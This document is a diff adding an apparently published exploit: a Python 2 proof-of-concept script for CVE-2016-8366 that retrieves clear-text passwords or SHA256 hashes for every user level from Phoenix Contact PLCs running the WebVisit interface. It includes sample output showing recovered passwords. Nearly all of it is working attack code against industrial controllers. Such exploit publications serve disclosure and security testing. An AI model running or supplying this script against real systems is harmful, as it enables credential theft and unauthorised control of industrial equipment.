@@ -1,0 +1,75 @@
+# Exploit Title: Phoenix Contact WebVisit 6.40.00 - Password Disclosure
+# Exploit Author: Deneut Tijl
+# Date: 2018-09-30
+# Vendor Homepage: www.phoenixcontact.com
+# Software Link: https://www.phoenixcontact.com/online/portal/nl/?uri=pxc-oc-itemdetail:pid=2985725&library=nlnl&pcck=P-19-05-01&tab=5
+# Version: WebVisit < 6.40.00
+# CVE: CVE-2016-8366
+
+# This script will perform retrieval of clear text credentials for a Phoenix Contact PLC with a WebVisit GUI, 
+# password protected, application on it Tested on the Phoenix Contact ILC-390 PLC, but others are 
+# surely equally vulnerable with WebVisit 6.40.00, the passwords are SHA256 hashes, which also will be retrieved
+		
+# Sample output:
+# C:\Users\admin\Desktop>CVE-2016-8366.py
+# Please enter an IP [192.168.1.200]:
+# This is the password for userlevel 1: pw1
+# This is the password for userlevel 2: SuperPass2
+# This is the password for userlevel 3: Extreme2TheMax3
+# This is the password for userlevel 4: PowerPass4
+# Press Enter to exit
+
+# PoC
+
+#! /usr/bin/env python
+
+import urllib2, binascii
+
+strIP = raw_input('Please enter an IP [192.168.1.200]: ')
+if strIP == '': strIP = '192.168.1.200'
+
+try:
+    URLResponse = urllib2.urlopen(urllib2.Request('http://' + strIP + '/'))
+except urllib2.HTTPError:
+    print('#### Critical Error with IP ' + strIP + ': no response')
+    raw_input('Press Enter to exit')
+    exit()
+
+strMainTEQ = ''
+for line in URLResponse.readlines():
+    if 'MainTEQName' in line:
+        strMainTEQ = line.split('VALUE="')[1].split('"')[0]
+
+if strMainTEQ == '':
+    print('#### Error, no \'MainTEQ\' found on the main page')
+    raw_input('Press Enter to exit')
+    exit()
+
+try:
+    LoginTeqResponse = urllib2.urlopen(urllib2.Request('http://' + strIP + '/' + strMainTEQ))
+except urllib2.HTTPError:
+    print('Critical Error with IP ' + strIP + ': File \'' + strMainTEQ + '\' not found')
+    raw_input('Press Enter to exit')
+    exit()
+strAlldata = ''
+for line in LoginTeqResponse.readlines():
+    strAlldata += binascii.hexlify(line)
+
+## For vulnerable webvisit:
+## Seems to be 'userLevel' + x bytes + 1 + y bytes + 'password'
+## userLevel + '0506030001' + 31 + '00030003010301068300' + passlength + 'password'
+## For WebVisit > 6.40.00
+## userLevel + '0003000301030b06830040' + 'SHA256' (wich is 64 bytes)
+
+arrData = strAlldata.split('757365724c6576656c0506030001') ## userLevel + '0506030001'
+for item in arrData:
+    if '00030003010301068300' in item:
+        intUserlevel = int(binascii.unhexlify(item[:2]), 16) ## Turn str '31' into int 1
+        strPassLength = item.split('00030003010301068300')[1][:2]
+        strPassword = binascii.unhexlify(item.split('00030003010301068300')[1][2:2+(2*int(strPassLength,16))])
+        print('This is the password for userlevel ' + str(intUserlevel) + ': ' + strPassword)
+    elif '0003000301030b06830040' in item:
+        intUserlevel = int(binascii.unhexlify(item[:2]), 16)
+        strHash = binascii.unhexlify(item.split('0003000301030b06830040')[1][:64*2])
+        print('This is the hash for userlevel ' + str(intUserlevel) + ': ' + strHash.lower())
+raw_input('Press Enter to exit')
